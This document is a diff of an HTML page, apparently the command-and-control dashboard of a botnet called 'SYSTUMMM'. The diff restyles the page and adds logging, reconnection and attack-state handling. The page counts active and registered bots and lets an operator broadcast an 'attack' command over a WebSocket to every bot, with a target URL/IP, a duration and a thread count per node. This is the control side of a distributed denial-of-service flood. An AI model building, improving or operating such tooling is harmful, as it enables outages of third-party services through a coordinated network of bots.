@@ -3,67 +3,301 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Botnet Control Panel</title>
+    <title>SYSTUMMM Botnet Dashboard</title>
     <style>
-        body { background: #0a0a0a; color: #00ff00; font-family: 'Courier New', Courier, monospace; display: flex; flex-direction: column; align-items: center; padding: 20px; }
-        .stats { border: 1px solid #00ff00; padding: 20px; margin-bottom: 20px; width: 300px; text-align: center; box-shadow: 0 0 10px #00ff00; }
-        .controls { border: 1px solid #00ff00; padding: 20px; width: 400px; box-shadow: 0 0 10px #00ff00; }
-        .input-group { margin: 10px 0; }
-        label { display: block; margin-bottom: 5px; font-size: 0.8em; text-transform: uppercase; }
-        input, button { background: #000; color: #00ff00; border: 1px solid #00ff00; padding: 10px; width: 100%; box-sizing: border-box; }
-        button:hover { background: #00ff00; color: #000; cursor: pointer; }
-        h1 { text-shadow: 0 0 5px #00ff00; }
+        :root {
+            --neon-green: #00ff41;
+            --dark-bg: #050505;
+            --card-bg: #0f0f0f;
+            --danger: #ff003c;
+            --warning: #ffcc00;
+        }
+
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            background: var(--dark-bg); 
+            color: var(--neon-green); 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 40px auto;
+            padding: 20px;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 40px;
+            position: relative;
+        }
+
+        h1 {
+            font-size: 3rem;
+            letter-spacing: 10px;
+            text-shadow: 0 0 10px var(--neon-green), 0 0 20px var(--neon-green);
+            text-transform: uppercase;
+        }
+
+        .grid {
+            display: grid;
+            grid-template-columns: 1fr 2fr;
+            gap: 20px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid #333;
+            padding: 25px;
+            border-radius: 4px;
+            transition: all 0.3s ease;
+        }
+
+        .card:hover {
+            border-color: var(--neon-green);
+            box-shadow: 0 0 15px rgba(0, 255, 65, 0.1);
+        }
+
+        .stats-grid {
+            display: grid;
+            grid-template-columns: 1fr;
+            gap: 15px;
+        }
+
+        .stat-item {
+            text-align: center;
+        }
+
+        .stat-value {
+            font-size: 2.5rem;
+            font-weight: bold;
+            display: block;
+        }
+
+        .stat-label {
+            font-size: 0.8rem;
+            color: #666;
+            text-transform: uppercase;
+        }
+
+        .controls h2, .log h2 {
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            border-left: 4px solid var(--neon-green);
+            padding-left: 10px;
+            text-transform: uppercase;
+        }
+
+        .input-group { margin-bottom: 15px; }
+        label { display: block; margin-bottom: 8px; font-size: 0.75rem; color: #888; text-transform: uppercase; }
+        
+        input {
+            background: #000;
+            color: var(--neon-green);
+            border: 1px solid #333;
+            padding: 12px;
+            width: 100%;
+            border-radius: 2px;
+            outline: none;
+            font-family: 'Courier New', Courier, monospace;
+        }
+
+        input:focus { border-color: var(--neon-green); }
+
+        button {
+            background: var(--neon-green);
+            color: #000;
+            border: none;
+            padding: 15px;
+            width: 100%;
+            font-weight: bold;
+            text-transform: uppercase;
+            cursor: pointer;
+            transition: 0.2s;
+            margin-top: 10px;
+            letter-spacing: 2px;
+        }
+
+        button:hover {
+            background: #00cc33;
+            box-shadow: 0 0 20px var(--neon-green);
+        }
+
+        button:active { transform: scale(0.98); }
+
+        .log-container {
+            margin-top: 20px;
+            background: #000;
+            height: 200px;
+            border: 1px solid #222;
+            padding: 10px;
+            font-size: 0.8rem;
+            font-family: 'Courier New', Courier, monospace;
+            overflow-y: auto;
+            color: #888;
+        }
+
+        .log-entry { margin-bottom: 5px; border-bottom: 1px solid #111; padding-bottom: 2px; }
+        .log-entry.command { color: var(--warning); }
+        .log-entry.success { color: var(--neon-green); }
+        .log-entry.error { color: var(--danger); }
+
+        .status-badge {
+            display: inline-block;
+            width: 10px;
+            height: 10px;
+            background: var(--neon-green);
+            border-radius: 50%;
+            margin-right: 5px;
+            animation: pulse 2s infinite;
+        }
+
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0px rgba(0, 255, 65, 0.4); }
+            70% { box-shadow: 0 0 0 10px rgba(0, 255, 65, 0); }
+            100% { box-shadow: 0 0 0 0px rgba(0, 255, 65, 0); }
+        }
+
+        .indicator {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 0.7rem;
+            color: #444;
+        }
     </style>
 </head>
 <body>
-    <h1>SYSTUMMM BOTNET</h1>
-    <div class="stats">
-        <h2>STATS</h2>
-        <p>Total Bots: <span id="total-bots">0</span></p>
-        <p>Active: <span id="active-bots">0</span></p>
-    </div>
-    <div class="controls">
-        <h2>COMMANDS</h2>
-        <div class="input-group">
-            <label>Target URL</label>
-            <input type="text" id="target" placeholder="http://example.com" value="http://example.com">
+    <div class="container">
+        <header>
+            <h1>SYSTUMMM</h1>
+            <div class="indicator"><span id="conn-status" style="color: var(--danger);">DISCONNECTED</span></div>
+        </header>
+
+        <div class="grid">
+            <div class="stats-grid">
+                <div class="card">
+                    <div class="stat-item">
+                        <span class="stat-value" id="active-bots">0</span>
+                        <span class="stat-label"><span class="status-badge"></span>Active Nodes</span>
+                    </div>
+                </div>
+                <div class="card">
+                    <div class="stat-item">
+                        <span class="stat-value" id="total-bots">0</span>
+                        <span class="stat-label">Total Registered</span>
+                    </div>
+                </div>
+            </div>
+
+            <div class="card controls">
+                <h2>C&C Terminal</h2>
+                <div class="input-group">
+                    <label>Target Infrastructure (URL/IP)</label>
+                    <input type="text" id="target" placeholder="https://..." value="http://localhost:8080">
+                </div>
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+                    <div class="input-group">
+                        <label>Burst Duration (s)</label>
+                        <input type="number" id="duration" value="30">
+                    </div>
+                    <div class="input-group">
+                        <label>Threads/Node</label>
+                        <input type="number" id="concurrency" value="100">
+                    </div>
+                </div>
+                <button onclick="launchAttack()" id="launch-btn">EXECUTE PROTOCOL</button>
+            </div>
         </div>
-        <div class="input-group">
-            <label>Duration (sec)</label>
-            <input type="number" id="duration" placeholder="60" value="60">
+
+        <div class="card log" style="margin-top: 20px; width: 100%;">
+            <h2>System Logs</h2>
+            <div class="log-container" id="log-container">
+                <div class="log-entry">Initializing dashboard components...</div>
+            </div>
         </div>
-        <div class="input-group">
-            <label>Concurrency (workers per bot)</label>
-            <input type="number" id="concurrency" placeholder="10" value="50">
-        </div>
-        <button onclick="launchAttack()">LAUNCH ATTACK</button>
     </div>
 
     <script>
-        const ws = new WebSocket('ws://localhost:3000?type=control');
-        
-        ws.onopen = () => {
-            console.log('Connected to Manager');
-        };
+        let ws;
+        const logContainer = document.getElementById('log-container');
+        const connStatus = document.getElementById('conn-status');
 
-        ws.onmessage = (event) => {
-            const data = JSON.parse(event.data);
-            if (data.type === 'stats') {
-                document.getElementById('total-bots').innerText = data.total;
-                document.getElementById('active-bots').innerText = data.active;
-            }
-        };
+        function log(msg, type = '') {
+            const entry = document.createElement('div');
+            entry.className = `log-entry ${type}`;
+            const time = new Date().toLocaleTimeString();
+            entry.innerText = `[${time}] ${msg}`;
+            logContainer.prepend(entry);
+        }
+
+        function connect() {
+            ws = new WebSocket('ws://' + window.location.hostname + ':3000?type=control');
+            
+            ws.onopen = () => {
+                log('Connection established with Manager.', 'success');
+                connStatus.innerText = 'ONLINE';
+                connStatus.style.color = '#00ff41';
+            };
+
+            ws.onmessage = (event) => {
+                const data = JSON.parse(event.data);
+                if (data.type === 'stats') {
+                    document.getElementById('total-bots').innerText = data.total;
+                    document.getElementById('active-bots').innerText = data.active;
+                } else if (data.type === 'bot_info') {
+                    log(`Node synced: ${data.id}`, 'success');
+                } else if (data.type === 'log') {
+                    log(data.message, data.level);
+                } else if (data.type === 'active_attack') {
+                    log(`Syncing active attack state: ${data.params.target}`, 'command');
+                    updateAttackUI(data.params.duration);
+                }
+            };
+
+            ws.onclose = () => {
+                log('Connection lost. Reconnecting in 5s...', 'error');
+                connStatus.innerText = 'OFFLINE';
+                connStatus.style.color = '#ff003c';
+                setTimeout(connect, 5000);
+            };
+        }
+
+        function updateAttackUI(duration) {
+            const btn = document.getElementById('launch-btn');
+            btn.innerText = "ATTACK IN PROGRESS...";
+            btn.style.background = "#ff003c";
+            btn.disabled = true;
+
+            setTimeout(() => {
+                btn.innerText = "EXECUTE PROTOCOL";
+                btn.style.background = "#00ff41";
+                btn.disabled = false;
+                log('Attack cycle completed.', 'success');
+            }, duration * 1000);
+        }
 
         function launchAttack() {
             const target = document.getElementById('target').value;
             const duration = parseInt(document.getElementById('duration').value);
             const concurrency = parseInt(document.getElementById('concurrency').value);
+
+            if (!target || isNaN(duration) || isNaN(concurrency)) {
+                log('Validation failed: Missing parameters.', 'error');
+                return;
+            }
+
             ws.send(JSON.stringify({
                 command: 'attack',
                 params: { target, duration, concurrency }
             }));
-            alert(`Attack broadcasted: ${concurrency} workers/bot requested.`);
+
+            log(`ATTACK BROADCAST: ${target} | Threads: ${concurrency} | Time: ${duration}s`, 'command');
+            updateAttackUI(duration);
         }
+
+        connect();
     </script>
 </body>
 </html>
